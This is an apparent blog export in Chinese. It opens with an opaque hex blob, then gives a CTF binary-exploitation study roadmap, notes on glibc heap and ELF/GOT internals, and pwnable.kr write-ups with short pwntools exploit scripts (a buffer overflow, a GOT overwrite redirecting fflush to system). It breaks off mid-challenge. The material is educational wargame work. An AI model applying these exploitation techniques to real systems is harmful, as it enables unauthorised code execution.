a50cb02d66d24dfd19127618c2036eec584d862a6467ae685783540c45ba007a36e38d9acdb514bd5f93018d485f42aa5c41a150a38794077064e8f8e700903351aae80794fc9713f69975e4b00a7c55f5659b776d97f8fdd4f18200898307f3722046bfd75add4f47cc975f3eae4ae3438743cd05db11fbbe8e590192a75d2ef9b3df62f4907c771ff6a99bb48b4756f411f3718c7aa88fb6fea116468687aa28bd59d2370fee2a024241e8c0e75d3a1069a361d1197198c252e582ef8a6aeaf0a76a83760305c0ec4b5afd0e4f3c1122dbe0ceef296c8ac065cfa92bba12bd2294ec6f4f3b0998cab381b3d93fd7dad9838cd9ecc9fc33baf3a08165dd9846a2f22c4cc63a0e0f4627c78425c53f67d18f96891bf12203168a974bf257987cbf0e1d9e959a39d5f49acc53f10ee0bdeaa676a5642d42a1b9c99cf728cd84b933e5102990996511fee063019103f9e00cdc3ee92593b3ea88f593c6e404274d5afacdb71b2e2920d92a52176b3d97040bbd02c9024b333db4c0c7d07654b8f8d0a8d6543995b2747fad5a3566f77d92e55bc4ea0d1d323b09b5ce0eae19f197fb3ea4bacc95d2e094cbd6669e8797af0770c7b2da0193f4ca0e32cf8c525957a08bf2960bb6dbd3ab68f1e52b1e5b71d54c3c51be5bf842c1652f4e2e428c5d242c870a6597bf708071266df1a9674d8201bd82989a5599a8ff1d75d1a0391e05d06eb42399bd9a4c56a3b20d3fc3370495db4f0682b336af54d4ab3446a5f24cff8ce3ba9027988b56231ccd22594cce58abc2ffff233d09f12d135ad1fb36685d43de3ce1644a149d49a80cbb95d8d2d5e72cc38574c08d4de28c6e35f8ff4460a2942218e80d5a0d21d06a4f2264b0bbad7291402dc96bcd2056f8131604763e47f6bcb423b1e140d84d61a23b980243c64066d4587dc29bebc102d4aa95346c74dd095e7a949a9b4c2eb1452ca4c24c94c413b94ad09d4b86912474d5bb225e065a09cc5854f1173850298758bb8ab4c954be4d001e62576e0d3bde5859a5a7529c3fa378c9068a34ffdccf4db57777526a489dc386aa84a1c6496698dc3b62ced171f8d71316146dbf120c9dc6738a80b3e29428a133a52c18045afbb4178b5fda47950eb85b7c53c27fc6721a1213fd35101250eeffcf32323796240c96c71c88dbf91558c7bce4e75f631b44e6f43738e8a940452a75dc3e8d6f5b63b2036aca6beebdf8fcd1c1ce844897e47f5cdb6afe006592b8cd588d5c2914ec2e457d949c2ac1fc3865aeba2d7984400d03f645f189220cf91bc9ce07bde1c4d3efc1feac266c499ba1858e33d61efd367574056822d795f4c486e0b70929ed6edb3e7cfb950ec0fa9860ecd7cf8488f3366b8eb75b024670fb4cfdb43d24cc2d7f67f54096690da047150cc0602de8da2007460680447af6e600be2de5ac0697fb72a50b9d4cc7319dc52fb095346181f70f92c0b276ece17f3c8fa3386f785fa3fd28a5f0008c2a278ce1f0df8c9c50930ca308c1143d04955aeb7c07e47d0ddc02e113132c2736997ecc519bf27b4a2bad82e87404f3d5c16d22b6d015b8ca7f4e2f61d0a0a1cc34529bd326af00dfcd4bc2b809a5ac1d184b6308f25ed971e932c43f50d4f13b5875476b31c91c1e7756993b65ce8b8c4f87a42723f03ceff2729ffa144efb553a151f71a554c46a38615269a397da3e4e6f943388b1f38277137f565f30263ab748ee60c70467d002cf2a516a89ba66990fe12563598497e3ed9905bda9a89c73952d5b23ca648a12c254f77dca5643fcd8e9a99d099913beef5554fa35dd8bea314724a4527f070b5941d126b4ade8ae06c57b25bcace33c63066f66c983f5288f6ac90b9067c205ceff0a402b3ab6807d8b234d4e4c8dc3747589f769be4e2f9d21e1087799beb808fc5301cbe770e5f7c5ddecb9ea39e6bfe5ba0543c054890b9f3dc20557bf2c7ce6e521f86918d1dd122cff13b4d61f066e093d76e14d3251028ecc7cc406def3efcfa05134c41c0098ffe4fd86ac66c998310249d8d43e8c368d96c558121c79ee304ce06a5a9ab790117b498903a7f623c6c16fd56402d310684dca3f3e9144e250313a6f57124762f62839c2a747c188305334fc06fa5991fb10b8323884e817fa3936c2a7c0813e56229d8807380bd51025cc7e1c469dc107843b0b88b2d6fad963218cb0f7e0687dba30b371f063b119a919f94ed5523e677c159c74d80c69add0be53a5342e556edea9d0f68eca443f5c2b2eb29790925cebc54052007e0b9eca6f6b130f9980b1f5073cc98db6a28c3eed5bd212b6233534bf753b82106fb9aaa7b55b704c60cb6f47183cf9efa775c5d11881d89a6d9a8d7bd155c5e23dffbf487634e1187a1737527d012d0df55ceb302526948dcadd6efc0d0027b5bc182d3aa184a55ab7c68b9bb2e029461c4d6adfeeba559591c3dbad0285508048fac3f625c506fe168a1c9ac9e2cfe9c24a4ba14b853ee9f20f18cd6fa1287c4efa1cc628d3ac0aaa54f2aeba3b9683418dbb9d32310a20f1e2f483c0a83230bfc49ea22aa7cdb414e665f0693a0d13505336d5913a7d11363d4cc252ecd920aaca6c71224358ef75b2743aa8b2082154c898819b1d21c9634413aab7cb054e21675a6bb007aafcb12a347b608a5c0c91a580b1e8ec3d9ddf93aea0367f0318fb0c649c8a5b5075319d0233d5adda7c78fe6936f1e561345e85ca9159819c54daf88eb2c95068d29125c4300f35f3bef0a62cb00f4ea7a592551f307701b39bfd0e801eb2c7f2caa76351dcc26f852c4b5c49950f31da914a32a3090c7ab64dbd621a970b96cada002e72ce4e5efe2ff299072a3c8b93391da4abc03d599d4c527589e488ec14bcb7d50926f4341eaf882942e2f341245b5de0b725154c972d4fe00c436d6a6f860c47fb8c7dbc98e5e6209817affb82d88d45d86d341aec813e0182712b5fe150556a67d5f5929df47cf4a063633a136b2c7097064ee1f8a0037a59647b3d981954eb17ae0f5ec9f0f021f35127815df28a1cd5de9c3e689d1b72a450964877c228cf50004d3ee03cb5c905638d64f32db08e46ad7b696566dd51cdde540e0c8ad0a031364dcd528ca4a31332bf25dd596445599bd2dadcaa34ff6400711c177e2c89a0259ce858889600175d59204337ee88d599f9b4b0d6de5346fbaef1ee4a9c2b23d99b1b88cdbaed02c97a93e4441b57288f35550189a49b5787717493015ee578d0a3f92722d492f67c33226031bec75c7436593b387552028ba1322701727a2de65a04065c56a63b3574d159ab7bd394097812135e028e450345103456f49b4eb1aef0ac4f9c659ac20c4e3c1c11bc974ca99d50bdc8815e56c27396a3c15d21f2798c6ec2e04f83b3f8910500a0ebf5f005e395ef826b05f7a573908d6846978b1003be562f56a3f213cfa3b31bd6409ff90f3369fb5f1a9be3fb1aee9ec07b21567b5380f6e30b6b415306cca58a58d7a8924c0ec53d7f64b0944a3d4199bb6dcded0190023d40ebed0830116a8ef5fe2dbd9899ddbc1bdcd2539bc6001afcd3bd193be95489aee1a5088ef5959ed9ddf6a211538a8ec13fa2742ada2b7d637ff2e7efb50d4381c4129ec6dc9921820d6bb990ec3a6ef12123eea97a33772c8ae5c384890bb854f7246659ed13a6b299d86bfa8154e2537b279c510a5f3f0852ef89219ae2cec0d9af2d35f7adfafeadafc67b96c3a2bce2ec7a7f4a45aaf0ac646b7901ed52798efaf8414e0642b75d108928513ab3b9cc889675c629108192e2e6b4c372850beb333272b6d645c9b23cdacc2d814c303305bb398ca567834ae5672c05a6aee2f2908e574ebd9a4824ae4d0b5c56d13a559c5ae2640c9b3c69c1e736c4486c26ea198dc7f697367d19509fe66c9b90374a4dbfb2a0fc26408e3f02f62c5602c33a4b02e0f8ccb875174ca2dd816b46cba338809b29b8070396265c110c28ef41e8ef132e03a6debcdbae584f82c5afbdde148ee7c3454ea42c57b0dff4b0cfe36ea261df2b841f2a60228da286f8655d656035cb7cfe7354d8f748fd3735c29efb4aec19dd44cc3083badb077133c2fa59f57e4ed7ea7553114aed4a450f5e9fa211b636cffa1b16b5118f64b5132eaf123f0db83c2328ee50651cf28abc561ae399c72dfbd07313a1f2d980e7596fcd21333bca55c314ffce6849460b32c178acfb442bacc218c9f30242f18e0c2c791eebd9748c62e44665e9f7ebd575e7ee38b70c900befae9782831357f9d3b1c69d520eaab151465862fd68a2fe1b9beb261a9a38b7a12c0d8f1f788cecf774a0879dec794aed9820e6946a86d156cb9f736fdb243f6a296b6188e73fe16c2560bfa29978dc84844147e4737aa5cba53d6a5f799c3cad1ac9a83df3215b2a44a9a93f716bc550325f89a59a38c24e58bcad242950f69d1051d910466c53eacf161e2b701af94d02bc9ea50d8ee663ad3b522b4208394dde3722d9072abbaca8dc64b41426da18ddf5bf474f8964bb16f8cc1a2428f5476bc9e698da4f5b059fc3f3353a7684898c06ceb76b4ccb68057a42abd8b585878650084273a2d41ea2b0aa9b59d5fa521bd60ec1f1501a53251ae8842e1395945321bdf3703a9122949f26890a69393b290bfcee8d02b973acfa242fa1955ee781711adccbd7d64541ac188175e6119c497c2da3a011ba0439e1629f9d24711da3a7d93f87243b510f58ee565aeb7dda819aa81eaa63a863e93e9293429a4a063210c65bec018e80381196e0c6278355957d028c3c76c489bc3ea3ed05c750692d7be59a9ccf0b96b2a322d05c75d0c8712ee983d]]></content>
      <categories>
        <category>私人空间</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[知识点总结与学习资料整理]]></title>
    <url>%2F2019%2F02%2F19%2F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[知识点总结：前提准备：工具准备： ubuntu虚拟机（建议装两个版本16.04和18.04，因为到后期堆的时候不同版本的ubuntu对应不同的glibc版本(我现在有5个版本)，而不同的glibc版本有不同的防御机制，思路会完全不一样。），当然有原装的更好了orz。 IDA pro。 gdb用于动态调试以及pwndbg插件，pwntools库。 vscode(虚拟机用的话会很卡，除非你分配8g内存给虚拟机。。。)。 Google，为什么不建议百度呢，因为google会显示出更多师傅的blog的文章，而百度大部分都是一些看似很牛逼但实际上不咋地的垃圾网站的帖子，无论是找学习资料还是找题解的wp，google都胜过百度。 知识准备： 汇编基础语法（对重点语句call，leave，retn等要有较深的理解） python基础语法 c语言较扎实（特别是指针和链表这一块） linux基本命令 第一阶段：pwnable.kr的第一部分：这一阶段主要的目的是了解pwn的题目形式，毕竟它和以往学的数学物理无论是学习还是做题形式都不一样，可能开始时都不会做，会毫无头绪直接看writeup，但是慢慢地就会习惯，找到套路，并且熟悉Linux的常用命令与怎么远程连接服务器，从远程服务器下载文件等基本功，等于是熟悉环境和题目大致形式的一个转变的过程。我的建议是在做完以后再自己独立地从头到尾地把exp整理一遍，确保自己能独立做出并理解其中的思想。 第二阶段：ctf-wiki与i春秋的体系学习：栈部分：分为以下几大块： 熟悉基本函数调用的栈的排布格局，理解leave，retn，call的意义，知道怎么算偏移，简称为基础栈溢出。 理解shellcode，在未开NX的情况下懂得利用shelllcode。 rop: 基础rop 带libc的rop brop stack pivot srop ret2_dl_runtime_reslove(32位和64位) ret2vsdo 在i春秋上有栈这一部分较完整的教程，且配有课后习题，比较好，配合wiki学习效果更佳，因为后来我发现看一篇文章很难理解一个技术，一般需要参考好几个orz（甚至上两位数），所以需要充足的耐心。 格式化字符串部分： i春秋的第六篇文章说的很清楚，题目质量也不错，配合wiki学习三天就可以结束（当然难度大的还是不行）。 堆部分： 学习堆的内存管理机制（较重要！！！不理解后面都是扯淡），当初我只是大致看了一下，感觉自己懂了，做题才发现自己太幼稚orz，堆是pwn中的重点内容，很多压轴都是建立在堆之上的。。所以这一块是重中之重！！ 堆漏洞： uaf，unlink，off-one-by（off-one-null)，double free，chunk overlapping。 堆溢出： fastbin-attack unsortedbin-attack largebin-attack house of orange house of spirit house of lore house of force house of roman house of atum（去年才出现） 其他：堆fengshui，，堆排布，堆喷（被鸡哥的薛定谔的堆虐惨了）等。。。。 第三阶段：专题刷题： 各个板块学习完以后的刷题，巩固知识点的理解。 第四阶段：综合刷题： 综合刷题，在不告诉你漏洞方向与漏洞点，没有提示的情况下独立做出来题目才是真本事。 资料整理：学习： ctf-wiki在阶段比较全的成体系的资料之一 i春秋论坛上比较好的栈和格式化字符串的学习资料，配有课后习题，个人感觉质量比较好 （在左上角的搜索框里输入pwn入门就会出现10篇教程，一篇一篇看即可） 看雪知识库 CTF-All-IN-ONE (一本即将出版的西电师傅写的ctf书，（我不知道为什么里面大部分都是pwn的内容），题目都是大型比赛的题，质量比较高) 一个pwn的项目收集，里面有很多工具和题目以及wp收集 一个ctf项目 在i春秋上搜pwn的网课，有一个Atum师傅的课，里面有不少资料和学习方法，推荐去看。 其实最好的学习方式就是自己耐下心来谷歌。。。 一些博客： 台湾的angleboy，里面很多技术的原理讲的很详细，强烈安利 不认识这位师傅，但是他很多文章写得很好 深入理解计算机系统浓缩总结 FlappyPig team的Swing师傅 vidar team的veritas501师傅 sakura师傅 fb战队的ios师傅 川大windows内核大佬wjllz 川大校队hpasserby师傅 天枢-P1umer 天枢-p4nda 天枢-sunichi 天枢-e3pem 天枢-ama2in9 菜鸡-xiaoxiaorenwu 刷题： 2018比赛题目收集 ctf-wiki里的题目 pwnable.kr pwnable.tw Jarvis oj xctf社区_攻防世界 ctf-all-in-one里收集的各大比赛的题目。 其他网站： shellcode收集站1 shellcode收集站2 libc数据库搜索 一个类似ctf-wiki的项目 （里面有很多我没提到的比较偏门的刷题网站） 还有很多小的资料都是在以上列举的这些大资料里的，就不一一列举。 （希望再过多年以后还能凭着自己内心的热爱为安全事业贡献一份力。。]]></content>
      <categories>
        <category>PWN基础</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[堆的理论知识学习]]></title>
    <url>%2F2019%2F02%2F13%2F%E5%A0%86%E7%9A%84%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[最近花了两天时间上网查阅资料学习了堆的内存管理模式，找到了几篇还不错的文章，在此分享一下： Linux堆内存管理深入分析上 Linux堆内存管理深入分析下 PWN之堆内存管理 申请内存块 看雪的求助 较详细的内存分配过程 Glibc 内存管理 Ptmalloc2 源代码分析 华庭（庄明强） (经典，较长但较详细，可自己上网找) 这几篇文章讲的已经比较详细，基础的东西我就不再赘述，只是总结一下我自己的一些心得和理解： 所谓堆的内存管理模式看起来比较复杂，主要原因是知识点较多，引入新的结构体和新函数比较多，让人一下子不能理解地那么深，或者说记忆不了那么多，耐心多看几遍就会好很多，需要一定的时间沉淀。 主要内容有三点： 一是几种结构体的介绍：malloc_state， malloc_chunk，heap_info，和chunk的结构 ||| fast_bins，small_bins，large_bins，unsorted_bin。 二是arena的介绍，多线程堆是如何管理的，malloc中mmap和brk的区别，main_arena和thread_arena的区别。（这一点在第一篇文章有详细介绍） 三是内存的分配与回收（最后一篇文章较详细），这一点最难也最重要，又全部围绕怎么让这个过程变得高效来设计（主要在于large chunk的分配需要进行碎片合并和整理的大循环）： 当malloc(size)的时候，先进行一部分处理和加锁后，开始正式分配，先看size的大小，如果在fast_bins之内，就先遍历fast_bins中有没有正好适合的chunk有的话分配后返回，没有的话或者size的大小大于64bytes小于512sizes则进入small_bins寻找，找到合适的返回，没有的话或者size大小大于512bytes属于large chunk，大循环开始，开始对fast_bins里的碎片开始整理和合并，物理地址相连的chunk合并以后放进unsorted_bin里，不能合并的直接放进unsorted_bins里，然后对unsorted_bin中的chunk从其尾指针指向的chunk开始（FIFO算法）进行遍历，if(大小刚好符合) {取出分配返回} else {将其放入对应的bin中，这个过程结束会将fast_bins和unsorted_bins清空}，遍历完成后再看last remainder chunk，其大小大于size时切割然后unsorted_bin的尾指针指向新的last remainder chunk，并更新储存其数据内容的结构。。。。 内容太多，直接看最后一篇文章吧QAQ。 orz]]></content>
      <categories>
        <category>PWN基础</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[二进制基础知识积累]]></title>
    <url>%2F2019%2F01%2F28%2F%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%B9%E9%9D%A2%E7%9F%A5%E8%AF%86%E6%89%A9%E5%85%85%2F</url>
    <content type="text"><![CDATA[PIE和ASLR：参考链接：对PIE和ASLR的理解 首先，ASLR的是操作系统的功能选项，作用于executable（ELF）装入内存运行时，因而只能随机化stack、heap、libraries的基址；而PIE（Position Independent Executables）是编译器（gcc，..）功能选项（-fPIE），作用于excutable编译过程，可将其理解为特殊的PIC（so专用，Position Independent Code），加了PIE选项编译出来的ELF用file命令查看会显示其为so，其随机化了ELF装载内存的基址（代码段、plt、got、data等共同的基址）。 PIE只是在编译的过程中赋予了ELF加载到内存时其加载基址随机化的功能，也就是说PIE编译出来的ELF如果在ASLR=0的情况下，ELF的加载基址也是不会变的。 所以这是ASLR 的三个级别变成了 ：0， 不开启任何随机化；1， 开启stack、libraries [、executable base（special libraries -^-） if PIE is enabled while compiling] 的随机化；2，开启heap随机化。 因而，我们会发现PIE编译出来的executable如果ASLR=0的话，基址也是不会变的（有能力但没使用），如果ASLR=1的话，即使按照ASLR定义这个级别似乎不会对heap基址随机化，但是由于executable的基址已经随机化了，所以heap的基址自然也就被随机化了：） ELF文件的结构：参考链接：参考 elf文件分三种类型： 1、目标文件（通常是.o); 2、可执行文件(我们的运行文件) 3、动态库(.so) ​ 我们先讲一下可执行文件。 ​ 可执行文件一般分成4个部分，能扩展，我们理解这4部分就够了。 ​ 1. elf文件头 ，这个文件是对elf文件整体信息的描述，在32位系统下是56的字节，在64位系统下是64个字节。 对于可执行文件来说，文件头包含的一下信息与进程启动相关 e_entry 程序入口地址 e_phoff segment偏移 e_phnum segment数量 ​ 2. segment表， 这个表是加载指示器，操作系统（确切的说是加载器，有些elf文件，比如操作系统内核，是由其他程序加载的）,该表的结构非常重要。 typedef struct { Elf64_Word p_type; / Segment type / Elf64_Word p_flags; / Segment flags / /*segment权限，6表示可读写，5表示可读可执行 Elf64_Off p_offset; / Segment file offset / /段在文件中的偏移/ Elf64_Addr p_vaddr; / Segment virtual address / /*虚拟内存地址，这个表示内存中的 Elf64_Addr p_paddr; / Segment physical address /物理内存地址，对应用程序来说，这个字段无用*/ Elf64_Xword p_filesz; / Segment size in file / /段在文件中的长度/ Elf64_Xword p_memsz; / Segment size in memory / /在内存中的长度，一般和p_filesz的值一样*/ Elf64_Xword p_align; / Segment alignment / / 段对齐/ } Elf64_Phdr; ​ 3. elf的主题，对于可执行文件来说，最主要的就是数据段和代码段 ​ 4. section表，对可执行文件来说，没有用，在链接的时候有用，是对代码段数据段在链接是的一种描述。 ​ 整个elf文件的组成可以使用下图来描述: ELF文件的载入和运行及动态链接：参考链接:重读《深入理解计算机系统》 运行地址也就是链接地址。实际上指的是，程序在运行过程中，该指令对应的内存地址。 我们再回到本系列的主题：程序的加载和运行。可执行程序生成之后，是保存在硬盘中的，当用户执行该程序的时候，该程序会被加载器按照program header table的描述将程序的代码段和数据段从硬盘加载到内存中。在使用MMU的机器上，CPU处理的地址是虚拟地址。同样的，加载到内存中的地址指的也是虚拟地址。由于虚拟内存的抽象，每个进程都认为其独占内存，因此，每个可执行程序总是可以被加载到相同的内存地址（虚拟地址），其实，这些内存地址都是位于各个可执行程序独自的内存空间的地址。但是，对于MMU来讲，这些相同的虚拟地址其实对应了不同的物理地址。而对于CPU来讲，指令是按照其虚拟地址一条条的被加载到CPU中运行的。 如上所述，加载器是按照program header table的描述来给程序代码段分配指令地址的。具体的过程如下： 还记得我们在可执行文件详解中segment和section的对应关系吧？每个section按照这个mapping表顺序排列构成了不同的segment。其中第2个segment就是可执行文件的代码段。代码段中第一个section是.interp，其起始地址是0x400238，然后，加上.interp section的大小，就是下一个section .note.ABI-tag的起始地址。依次类推，对于可执行文件详解中的可执行文件add来讲，其.text的起始地址就是0x400430。 为什么对于X86_64架构来讲，所有可执行文件的text segment的起始地址都是0x400000? 实际上是链接脚本规定的，在链接过程中，链接器会根据链接脚本的描述来构建可执行文件。对于X86_64来讲，其默认的链接脚本位于/usr/lib/ldscripts/elf_x86_64.x。在其中我们发现这句话：__executable_start = SEGMENT_START(&quot;text-segment&quot;, 0x400000))它指定了可执行的text segment应起始于0x400000。 根据上述objdump -d的输出，.text的第一个函数是_start，因此，_start的第一条指令地址就是0x400430。后面每个函数的地址等于它的上一个函数的地址加上该函数自身的字节数。这样，完成了给每个函数重定位（分配运行地址）的过程。 函数中的每条指令的地址的重定位类似于函数重定位。函数的首地址即是第一条指令的首地址，后面每条指令的地址依次等于上一条指令的地址加上该指令的字节数。回忆编译过程分析中，在编译完成后，指令引用外部符号时，生成了对应的操作数和符号的占位符，此时，对于除动态链接库的符号外，其他的符号都已经有了确定的地址。因此，结合符号表我们就可以将类似的指令完成重定位。 比如在本例中，对于main函数来讲，调用了两个外部函数add和printf，根据上面信息，add函数相关的代码已经确定在0x400526处。因此，该地址就是call指令的调用add的操作数。而上述代码显示的400400处似乎并非是printf函数真正的实现。没错，这是因为printf函数是属于libc的库函数，但是，我们知道对于动态链接来讲，在生成可执行文件时，并未将它所依赖的动态库的代码复制过来，而只是复制了相关的重定位信息和符号表，所以，此时依然不能确定printf函数的地址。而400400处的内存值只是一个跳板，等程序运行时，动态链接器会将相关动态链接库的代码链接进来，修改这个跳板处对应的值，就可以让跳转指令正确的跳转到printf函数真正的内存地址处执行了。稍后我们将会对该过程做详细的分析。（涉及到PLT和GOT表的知识） 上篇文章我们提到，为了保证代码复用和节省计算机资源，在链接时，动态链接库的代码段和数据段等是不会被复制到最终生成的可执行文件中的，这些部分会在程序加载的时候复制到内存，并做动态链接，使原来可执行文件能够对其中定义的符号正常引用。也就是说在这个时候，可执行文件代码段中对动态链接库包含的符号引用的地址才真正确定下来。但是我们查看各个segment的属性可以知道，.text segment是只读的，也就是说在编译成可以执行文件之后，就不能被修改了，那么如何确保它能够正确的引用在加载时才能确定下来的动态链接库里的符号呢？这就需要我们这篇文章里的GOT和PLT作为跳板来实现了。 GOT全称Global Offset Table，即全局偏移量表。它在可执行文件中是一个单独的section，位于.data section的前面。每个被目标模块引用的全局符号（函数或者变量）都对应于GOT中一个8字节的条目。编译器还为GOT中每个条目生成一个重定位记录。在加载时，动态链接器会重定位GOT中的每个条目，使得它包含正确的目标地址。 PLT全称Procedure Linkage Table，即过程链接表。它在可执行文件中也是一个单独的section，位于.textsection的前面。每个被可执行程序调用的库函数都有它自己的PLT条目。每个条目实际上都是一小段可执行的代码。]]></content>
      <categories>
        <category>PWN基础</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[pwnable.kr第一部分exp与思路]]></title>
    <url>%2F2018%2F12%2F26%2Fpwnable-kr%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86exp%E4%B8%8E%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[写这些没用的东西也没啥目的，除了回忆一下知识之外也就是练一下exp的书写，因为很多题没必要用exp所以那时候做就没练过。。。。。pwnable.kr第一部分确实很适合初学者做，大多为知识题，主要是强迫你去学知识，而且后面几题建立出一个基本框架，此外搭配jarvis.oj和ctf-wiki有体系的学习更好，完成这些再去pwnable.tw。。。 fd思路：1.有源码肯定先分析源码： 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf("pass argv[1] a number\n"); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp("LETMEWIN\n", buf))&#123; printf("good job :)\n"); system("/bin/cat flag"); exit(0); &#125; printf("learn about Linux file IO\n"); return 0;&#125; 2.题意简单明了：先找flag，发现当buf中装的是LETMEWIN时获得flag，回头找buf从何而来，发生了啥， read()中从fd文件符读32字节，fd即为文件操作符，只有当fd=0时我们才能通过输入控制，所以使argv[1]=&#39;0x1234&#39; 即可。 exp： 12345from pwn import * s=ssh(host='pwnable.kr',user='fd',password='guest',port=2222)p=s.process(argv=['./fd','4660'],executable='./fd')p.sendline('LETMEWIN')p.interactive() collision思路：1. 有源码看源码： 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf("usage : %s [passcode]\n", argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf("passcode length should be 20 bytes\n"); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system("/bin/cat flag"); return 0; &#125; else printf("wrong passcode.\n"); return 0;&#125; 先看代码结构：有两个函数，main()和check_password()，先看main()找到关于flag的语句，当hashcode等于将第二个参数传入check_password后的返回值时，拿到flag，hashcode已给出，分析check_password()即可，​ int* ip = (int*)p; 此句为理解关键，将char类型指针强转为int型，ip每加一移动4个字节，所以题意为将输入的20个字节的参数分为5组，累加后等于0x21dd09ec即可 计算器：0x01010101 * 4 +0x1dd905e8 = 0x21dd09ec （看网上说有坏字符的影响，但这么多数，随便选一个也可以了吧。。。。） exp: 12345from pwn import * s=ssh(host='pwnable.kr',user='col',password='guest',port=2222)str=p32(0x01010101)*4 + p32(0x1dd905e8)p=s.process(argv=['./col',str],executable='./col')p.interactive() bof思路：1. 下载看源码： 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf("overflow me : "); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system("/bin/sh"); &#125; else&#123; printf("Nah..\n"); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; 这题是最基础的缓冲区溢出，只要对其有过一点研究的人都应该没什么问题，ctfwiki上有全面详细的剖析，推荐自学参考 ctf-wiki 看完以后再做这个绝对没有问题 很明显对含有gets()的func()进行溢出，用overflowme覆盖key，将key变成0xcafebabe exp: 12345from pwn import * s=remote('pwnable.kr',9000)payload='A'*0x34 + p32(0xcafebabe)s.sendline(payload)s.interactive() flag思路：1. 没给源码，只有elf文件，直接放进ida中，因为题目提示了This is reversing task. all you need is binary所以F5大法基本不管用了，再看其函数少的可怜（基本是加壳了），再看hex-view 机器码一行一行看时发现一句话 this file is packed with the UPX.......很明显，这题需要upx的知识储备，寻找谷歌百度 ，发现文件被Upx方式加壳，需要解壳。 先下载upx 然后在flag所在目录解壳flag,之后再把它放进ida中，看源码得知他要把flag复制进malloc()里，但是我们可以其实可以直接双击flag直接看注释得知flag…..可能是bug…. 或者在gdb里也可以直接在传递flag给rdx的指令后下个断点，然后在已字符串形式查看rdx的值即可。 passcode思路： 1. 老套路有源码看源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf("enter passcode1 : "); scanf("%d", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf("enter passcode2 : "); scanf("%d", passcode2); printf("checking...\n"); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123; printf("Login OK!\n"); system("/bin/cat flag"); &#125; else&#123; printf("Login Failed!\n"); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf("enter you name : "); scanf("%100s", name); printf("Welcome %s!\n", name);&#125;int main()&#123; printf("Toddler's Secure Login System 1.0 beta.\n"); welcome(); login(); // something after login... printf("Now I can safely trust you that you have credential :)\n"); return 0; &#125; 这题有点小难度：（首先应注意到welcome()和login()同在main()里且之间没有多余操作，所以他们ebp应该一样。）第一个思路是直接把system()的地址放进welcome()的ret里，后来发现name虽然限制了为100，但是name偏移了70h，失败。第二个思路是看passcode1和passcode2的地址，通过welcome中的name设计数据来控制他们的值：有两个地方行不通：1.passcode1与2与name的偏移大于100 。 2.passcode1为338150（0x000582E6），passcode2为13371337（0x00cc07c9）即可，然而且不论这两个地址是否是可写的，至少00字节的存在就因为截断而打消念想了。 所以这个时候问题就变得比较操蛋，需要查资料和新的东西了，通过调试理解plt和got表 诞生一种新方法，双重scanf()连续修改，在welcome()的scanf()利用name设计passcode1（需先确定passcode1的地址相对name的偏移）的值，将其值设为fflush()的got表地址，在login()的第一个scanf()向passcode1所指向的地址（Got表中原本写的是调用flush()指令的地址）改为调用system函数指令的地址，所以之后调用fflush()的时候就会调用system（）。 exp: 123456from pwn import *s=ssh(host='pwnable.kr',port=2222,user='passcode',password='guest')p=s.process('./passcode')payload='a'* 0x60 + '\x04\xa0\x04\x08' + '134514147'p.sendline(payload)p.interactive() exp需注意的地方：应数是输入给scanf 有固定格式，不能随便输入，例如%d只能为十进制整数，将134514147换成0x080485e3则不对。 random思路：1. 有源码 123456789101112131415161718#include &lt;stdio.h&gt;int main()&#123; unsigned int random; random = rand(); // random value! unsigned int key=0; scanf("%d", &amp;key); if( (key ^ random) == 0xdeadbeef )&#123; printf("Good!\n"); system("/bin/cat flag"); return 0; &#125; printf("Wrong, maybe you should try 2^32 cases.\n"); return 0;&#125; 明显看出rand()的种子为固定的，所以其值也为固定的值，自己写一个程序跑一下就可以得出其结果，然后用公式a或b=c，则a/b=c或b/a。用计算器得出答案。 exp: 12345from pwn import * s=ssh(host='pwnable.kr',user='random',port=2222,password='guest')p=s.process('./random')p.sendline('3039230856')p.interactive() input思路：1. 有源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main(int argc, char* argv[], char* envp[])&#123; printf("Welcome to pwnable.kr\n"); printf("Let's see if you know how to give input to program\n"); printf("Just give me correct inputs then you will get the flag :)\n"); // argv if(argc != 100) return 0; if(strcmp(argv['A'],"\x00")) return 0; if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0; printf("Stage 1 clear!\n"); // stdio char buf[4]; read(0, buf, 4); 